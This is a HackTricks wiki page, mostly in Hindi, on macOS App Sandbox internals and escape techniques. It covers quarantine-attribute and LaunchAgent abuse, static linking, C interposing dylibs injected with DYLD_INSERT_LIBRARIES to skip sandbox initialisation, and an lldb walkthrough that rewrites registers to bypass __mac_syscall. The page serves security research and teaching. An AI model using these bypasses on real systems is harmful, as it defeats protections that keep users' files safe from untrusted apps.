# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox loading process

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

पिछली छवि में यह देखा जा सकता है कि **सैंडबॉक्स कैसे लोड होगा** जब एक एप्लिकेशन जिसमें अधिकार **`com.apple.security.app-sandbox`** है, चलाया जाता है।

कंपाइलर `/usr/lib/libSystem.B.dylib` को बाइनरी से लिंक करेगा।

फिर, **`libSystem.B`** अन्य कई फ़ंक्शंस को कॉल करेगा जब तक कि **`xpc_pipe_routine`** ऐप के अधिकारों को **`securityd`** को नहीं भेजता। Securityd यह जांचता है कि क्या प्रक्रिया को सैंडबॉक्स के अंदर क्वारंटाइन किया जाना चाहिए, और यदि हां, तो इसे क्वारंटाइन किया जाएगा।\
अंत में, सैंडबॉक्स को **`__sandbox_ms`** को कॉल करके सक्रिय किया जाएगा, जो **`__mac_syscall`** को कॉल करेगा।

## Possible Bypasses

### Bypassing quarantine attribute

**सैंडबॉक्स किए गए प्रक्रियाओं द्वारा बनाए गए फ़ाइलों** में **क्वारंटाइन विशेषता** जोड़ी जाती है ताकि सैंडबॉक्स से बचा जा सके। हालाँकि, यदि आप **क्वारंटाइन विशेषता के बिना एक `.app` फ़ोल्डर बनाने में सफल होते हैं** सैंडबॉक्स किए गए एप्लिकेशन के भीतर, तो आप ऐप बंडल बाइनरी को **`/bin/bash`** की ओर इंगित कर सकते हैं और **plist** में कुछ env वेरिएबल जोड़ सकते हैं ताकि **`open`** का दुरुपयोग करके **नए ऐप को बिना सैंडबॉक्स के लॉन्च** किया जा सके।

यह वही किया गया था [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

> [!CAUTION]
> इसलिए, इस समय, यदि आप केवल **`.app`** के नाम के साथ एक फ़ोल्डर बनाने में सक्षम हैं जिसमें क्वारंटाइन विशेषता नहीं है, तो आप सैंडबॉक्स से बच सकते हैं क्योंकि macOS केवल **`.app` फ़ोल्डर** और **मुख्य निष्पादन योग्य** में **क्वारंटाइन** विशेषता की **जांच** करता है (और हम मुख्य निष्पादन योग्य को **`/bin/bash`** की ओर इंगित करेंगे)।
>
> ध्यान दें कि यदि एक .app बंडल को पहले से चलाने के लिए अधिकृत किया गया है (इसमें चलाने के लिए अधिकृत झंडा के साथ क्वारंटाइन एक्सट्र है), तो आप इसका भी दुरुपयोग कर सकते हैं... सिवाय इसके कि अब आप **`.app`** बंडलों के अंदर लिख नहीं सकते जब तक कि आपके पास कुछ विशेषाधिकार प्राप्त TCC अनुमतियाँ न हों (जो आपको उच्च सैंडबॉक्स के अंदर नहीं मिलेंगी)।

### Abusing Open functionality

[**शब्द सैंडबॉक्स बायपास के अंतिम उदाहरणों**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) में देखा जा सकता है कि **`open`** CLI कार्यक्षमता का दुरुपयोग कैसे किया जा सकता है सैंडबॉक्स को बायपास करने के लिए।

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

भले ही एक एप्लिकेशन **सैंडबॉक्स किया गया हो** (`com.apple.security.app-sandbox`), यदि इसे **LaunchAgent** (`~/Library/LaunchAgents`) से चलाया जाता है, तो सैंडबॉक्स को बायपास करना संभव है।\
जैसा कि [**इस पोस्ट**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) में समझाया गया है, यदि आप एक सैंडबॉक्स किए गए एप्लिकेशन के साथ स्थिरता प्राप्त करना चाहते हैं, तो आप इसे स्वचालित रूप से एक LaunchAgent के रूप में निष्पादित कर सकते हैं और शायद DyLib पर्यावरण वेरिएबल के माध्यम से दुर्भावनापूर्ण कोड इंजेक्ट कर सकते हैं।

### Abusing Auto Start Locations

यदि एक सैंडबॉक्स प्रक्रिया **लिख सकती है** एक ऐसी जगह पर जहां **बाद में एक बिना सैंडबॉक्स एप्लिकेशन बाइनरी चलाने जा रहा है**, तो यह **सिर्फ वहां बाइनरी रखकर** बचने में सक्षम होगी। इस प्रकार के स्थानों का एक अच्छा उदाहरण `~/Library/LaunchAgents` या `/System/Library/LaunchDaemons` हैं।

इसके लिए आपको **2 चरणों** की आवश्यकता हो सकती है: एक प्रक्रिया बनाने के लिए जिसमें **अधिक अनुमति वाला सैंडबॉक्स** (`file-read*`, `file-write*`) हो जो आपके कोड को निष्पादित करेगा जो वास्तव में एक ऐसी जगह पर लिखेगा जहां इसे **बिना सैंडबॉक्स के निष्पादित किया जाएगा**।

इस पृष्ठ को **ऑटो स्टार्ट स्थानों** के बारे में देखें:

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusing other processes

यदि आप उस सैंडबॉक्स प्रक्रिया से **अन्य प्रक्रियाओं को समझौता करने में सक्षम हैं** जो कम प्रतिबंधात्मक सैंडबॉक्स (या कोई नहीं) में चल रही हैं, तो आप उनके सैंडबॉक्स में भागने में सक्षम होंगे:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Static Compiling & Dynamically linking

[**यह शोध**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ने सैंडबॉक्स को बायपास करने के 2 तरीके खोजे। क्योंकि सैंडबॉक्स उपयोगकर्ता भूमि से लागू होता है जब **libSystem** पुस्तकालय लोड होता है। यदि एक बाइनरी इसे लोड करने से बच सकती है, तो यह कभी भी सैंडबॉक्स नहीं होगी:

- यदि बाइनरी **पूर्ण रूप से स्थिर रूप से संकलित** होती है, तो यह उस पुस्तकालय को लोड करने से बच सकती है।
- यदि **बाइनरी को किसी पुस्तकालय को लोड करने की आवश्यकता नहीं है** (क्योंकि लिंकर भी libSystem में है), तो इसे libSystem को लोड करने की आवश्यकता नहीं होगी।

### Shellcodes

ध्यान दें कि **यहां तक कि शेलकोड** ARM64 में `libSystem.dylib` में लिंक करने की आवश्यकता होती है:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Entitlements

ध्यान दें कि भले ही कुछ **क्रियाएँ** **सैंडबॉक्स द्वारा अनुमति दी जा सकती हैं** यदि एक एप्लिकेशन के पास एक विशिष्ट **अधिकार** है, जैसे कि:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

**Interposting** के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` सैंडबॉक्स को रोकने के लिए
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` सैंडबॉक्स को रोकने के लिए
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug & bypass Sandbox with lldb

आइए एक ऐसा एप्लिकेशन संकलित करें जिसे सैंडबॉक्स किया जाना चाहिए:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
फिर ऐप को संकलित करें:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> ऐप **`~/Desktop/del.txt`** फ़ाइल को **पढ़ने** की कोशिश करेगा, जिसे **Sandbox अनुमति नहीं देगा**।\
> वहाँ एक फ़ाइल बनाएं क्योंकि एक बार Sandbox को बायपास करने के बाद, यह इसे पढ़ सकेगा:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

आइए एप्लिकेशन को डिबग करें ताकि यह देखा जा सके कि Sandbox कब लोड होता है:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **सैंडबॉक्स बायपास होने के बावजूद TCC** उपयोगकर्ता से पूछेगा कि क्या वह प्रक्रिया को डेस्कटॉप से फ़ाइलें पढ़ने की अनुमति देना चाहता है

## संदर्भ

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
